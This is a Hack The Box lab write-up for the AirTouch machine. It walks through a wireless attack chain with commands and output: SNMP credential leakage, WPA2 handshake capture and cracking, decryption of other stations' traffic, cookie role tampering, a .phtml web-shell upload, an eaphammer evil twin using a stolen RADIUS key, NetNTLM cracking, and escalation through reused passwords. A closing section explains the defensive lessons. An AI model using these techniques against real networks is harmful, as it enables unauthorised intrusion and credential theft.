# AirTouch — Hack The Box, Medium, Linux (wireless)

**TL;DR:** SNMP `public` prints a consultant's SSH password; that host is a
container fronting three wireless VLANs. A rockyou WPA2-PSK (`challenge`) gets you
onto the tablets network, where the same key decrypts a client's cleartext HTTP
session — a `UserRole` cookie the server trusts, flipped to `admin`, unlocks a
`.phtml` upload (RCE). The web app's source leaks a Unix password with
`sudo NOPASSWD: ALL`, and that host stores the **corporate RADIUS server's private
key** in a world-readable backup. Import the key into an evil twin, harvest the
802.1X PEAP credential (`laboratory`), join the corp VLAN, and a world-readable
`hostapd_wpe.eap_user` hands over an `admin` password reused for a `sudo`-all Unix
account → root.

The whole chain is configuration, not a single CVE. The interesting lesson is that
enterprise wireless security lives or dies by the file permissions on the RADIUS
key, not by the client configuration — the corporate supplicants were configured
*correctly* and refused a self-signed twin nineteen times.

---

## Reconnaissance

A full TCP sweep returns exactly one port:

```
$ nmap -Pn -p- --min-rate 3000 10.129.x.x
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
```

One open port on a 65,535-port sweep means look elsewhere. Run UDP in parallel —
this is the whole reason to do it, and skipping it here costs the engagement:

```
$ nmap -Pn -sU --top-ports 100 10.129.x.x
161/udp open  snmp
```

## SNMP hands over a password

`public` works on v1 and v2c. The MIB view is deliberately narrowed to `system`,
and line one is the point:

```
$ snmpwalk -v2c -c public 10.129.x.x 1.3.6.1.2.1.1
iso.3.6.1.2.1.1.1.0 = STRING: "The default consultant password is: <redacted> (change it after use it)"
iso.3.6.1.2.1.1.4.0 = STRING: "admin@AirTouch.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "Consultant"
```

`sysName = Consultant`, so the username is not a guess:

```
$ ssh consultant@10.129.x.x
consultant@AirTouch-Consultant:~$ id
uid=1000(consultant) ... sudo (ALL) NOPASSWD: ALL
```

Instant root — but `/.dockerenv` is present, the interface is `172.20.1.2/24`, and
there is no flag anywhere. This is a container, and the only neighbour on the wire
is the gateway.

## The box tells you what it is

Two things reframe the engagement:

- `~/diagram-net.png` — three VLANs: **Consultant** 172.20.1.0/24 (you),
  **Tablets** behind SSID `AirTouch-Internet` (192.168.3.0/24), **Corp** behind
  SSID `AirTouch-Office` (10.10.10.0/24).
- `/root/eaphammer` — a full checkout with `hostapd-eaphammer`, `hcxtools`,
  `hcxdumptool` and Responder already built.

And seven simulated radios:

```
$ iw dev | grep Interface
Interface wlan0 ... wlan6      # mac80211_hwsim, all down
```

Bring one up and survey both bands:

```
SSID: AirTouch-Internet   ch 6    PSK
SSID: AirTouch-Office     ch 44   802.1X (MGT)   (two BSSIDs)
```

Three stations probe for `AirTouch-Office`; nothing is on the PSK net.

## The evil twin fails — informatively

The obvious move is a twin against the enterprise SSID. With a self-signed cert,
after deauthenticating the corp clients onto it:

```
CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25   (PEAP)
SSL3 alert ... fatal:unknown ca
CTRL-EVENT-EAP-FAILURE                               (x19)
```

The supplicants validate the RADIUS certificate — correctly configured, unbeatable
with a self-signed twin. This is the machine's actual lesson: park the enterprise
SSID and go find the real server key elsewhere.

## A clientless handshake on the PSK network

`AirTouch-Internet` has no associated client, so `airodump-ng` sits idle.
`hcxdumptool` actively solicits an association:

```
$ hcxdumptool -i wlanN -o out.pcapng --filterlist=filter.txt --filtermode=2 --enable_status=3
[...] f0:9f:c2:a3:f1:a7 -> 28:6c:07:fe:a3:22 [FOUND AUTHORIZED HANDSHAKE ...]
```

Convert and crack (`aircrack-ng` won't read pcapng — go via `editcap`):

```
$ hcxpcapngtool -o hs.22000 out.pcapng
$ editcap -F pcap out.pcapng out.cap
$ aircrack-ng -w rockyou.txt -b F0:9F:C2:A3:F1:A7 out.cap
KEY FOUND! [ challenge ]
```

`wpa_supplicant` + `dhclient` → `192.168.3.31`. The tablets VLAN holds one other
host: the gateway `192.168.3.1` (22/53/80).

## The PSK is a decryption key

Port 80 is a login page — no default creds, no SQLi, `feroxbuster` finds only a
`403` on `/uploads/`. The way in is the key already in hand: WPA2-PSK lets anyone
holding the passphrase decrypt every other station's traffic. Capture on ch6, and
**deauth a client inside the capture window** so its 4-way handshake lands in the
same file (without it, `airdecap-ng` decrypts zero packets — the trap that reads
like a wrong password):

```
$ airdecap-ng -e AirTouch-Internet -p challenge tab-01.cap
Number of decrypted WPA packets    97738
```

Filter your own traffic out and one host remains:

```
$ tshark -r dec.cap -Y 'http.request && ip.src != 192.168.3.31' -T fields -e ip.src -e http.request.full_uri -e http.cookie
192.168.3.74  http://192.168.3.1/lab.php  PHPSESSID=<redacted>; UserRole=user
```

## Two bugs in one cookie

Replaying `PHPSESSID` logs you in as `manager`; everything is `disabled`. The
second cookie is the bug — the server told the browser its role and now trusts it
back. Flip `UserRole=user` → `admin`:

```html
<h3>Hello, manager (admin)!</h3>
<form ... enctype="multipart/form-data"><input type="file" name="fileToUpload">
```

No filter, and the app's own `logout.phtml` proves `.phtml` executes:

```
$ curl -F 'fileToUpload=@sh.phtml' -F 'submit=Upload File' -b 'PHPSESSID=<redacted>; UserRole=admin' http://192.168.3.1/index.php
The file sh.phtml has been uploaded to folder uploads/
$ curl 'http://192.168.3.1/uploads/sh.phtml?c=id'
uid=33(www-data) ...  AirTouch-AP-PSK
```

## The comment that was still live

`login.php` holds its user table inline:

```php
/*'user' => array('password' => '<redacted>', 'role' => 'admin'),*/
'manager' => array('password' => '<redacted>', 'role' => 'user')
```

The commented-out password is the local `user` account's, and it has
`sudo NOPASSWD: ALL`. `user.txt` is in `/root` here:

```
user@AirTouch-AP-PSK:~$ sudo cat /root/user.txt
<user flag redacted>
```

And so is the reason to keep going — `/root/send_certs.sh`:

```bash
REMOTE_USER="remote"; REMOTE_PASSWORD="<redacted>"
sshpass -p "$REMOTE_PASSWORD" scp -r "/root/certs-backup/" "$REMOTE_USER@10.10.10.1:~/certs-backup/"
```

`/root/certs-backup/` holds the corporate RADIUS `ca.crt`, `server.crt` and an
**unencrypted `server.key`**.

## Now the twin works

```
$ eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt --private-key server.key
$ eaphammer -i wlanN -e AirTouch-Office -c 44 --auth wpa-eap --creds
```

Same deauth, and this time TLS completes:

```
mschapv2:  domain\username: AirTouch\r4ulcl
           jtr NETNTLM: r4ulcl:$NETNTLM$<challenge>$<response>
$ john --format=netntlm --wordlist=rockyou.txt netntlm.txt
laboratory   (r4ulcl)
```

## The identity oracle

`r4ulcl:laboratory` fails — as do domain variants, TTLS, and MAC spoofing. Rather
than guess, read the verbose exchange:

```
$ wpa_supplicant -B -dd -i wlanN -c net.conf -f w.log
EAP-PEAP: TLS done, proceed to Phase 2
EAP-PEAP: Phase 2 Request: type=1      (Identity)
EAP-PEAP: received Phase 2: code=4     (Failure)   <- server never offered MSCHAPv2
```

Certificate accepted, then the server rejects the inner identity outright. That
asymmetry is a free **username oracle** — sweep identities and grade the phase-2
type:

```
[r4ulcl]              -> (no phase 2)
[AirTouch\r4ulcl]     -> type=1, type=26, EAP-SUCCESS   <- required domain prefix
[admin]               -> type=1, type=26, Failure       <- valid user, wrong password
```

The domain-qualified form connects (and `admin` is confirmed as a second real
account for free):

```
$ dhclient wlan2
DHCPACK of 10.10.10.86 from 10.10.10.1
```

## The last hop is a file permission

The corp VLAN holds one other host: `10.10.10.1`, `AirTouch-AP-MGT` (22/53). The
`remote` password from `send_certs.sh` gets a shell (no sudo). But `ps` shows
`hostapd_aps /root/mgt/hostapd_wpe.conf`, and while `/root` is closed, its config
dir is not:

```
$ ls -la /etc/hostapd/hostapd_wpe.eap_user
-rwxr-xr-x 1 root root ... hostapd_wpe.eap_user
$ grep MSCHAPV2 /etc/hostapd/hostapd_wpe.eap_user
"AirTouch\r4ulcl"  MSCHAPV2  "<redacted>"
"admin"            MSCHAPV2  "<redacted>"
```

The RADIUS store is cleartext (MSCHAPv2 requires a reversible secret) and
world-readable. `admin` exists as a local Unix account, same password,
`sudo NOPASSWD: ALL`:

```
admin@AirTouch-AP-MGT:~$ sudo cat /root/root.txt
<root flag redacted>
```

## Why it fell

Nothing had a CVE number:

- a password typed into an SNMP description field
- a WPA2 passphrase that is a rockyou word (which is also a decryption key)
- session state over plain HTTP on a network whose key you hold
- authorisation decided by a client-supplied cookie
- an upload directory that executes what you put in it
- a secret "removed" by commenting it out
- a RADIUS **private key** copied onto an access point for convenience
- a world-readable RADIUS credential store
- one password reused for a service account and a `sudo`-all login

The corporate clients were configured correctly and refused a self-signed twin
nineteen times. That control was defeated by handing them the organisation's own
key — which is the argument for treating the RADIUS key, not the client config, as
the thing that decides whether enterprise wireless is actually secure.

## Things that cost time

- **Not reading the UDP scan first** — it finished before the TCP sweep and had the
  only interesting service.
- **`airdecap-ng` returning 0** — decryption needs the handshake *in the same
  capture*; deauth into the window.
- **`eaphammer` dying silently** — it calls `input()` and dies on EOF when
  backgrounded (`sleep 7200 | ./eaphammer …`); and `pkill -f` matched the SSH
  command line and killed the session.
- **Guessing the 802.1X identity** — five blind attempts before turning on `-dd`
  and letting the protocol's own error path answer in one sweep.
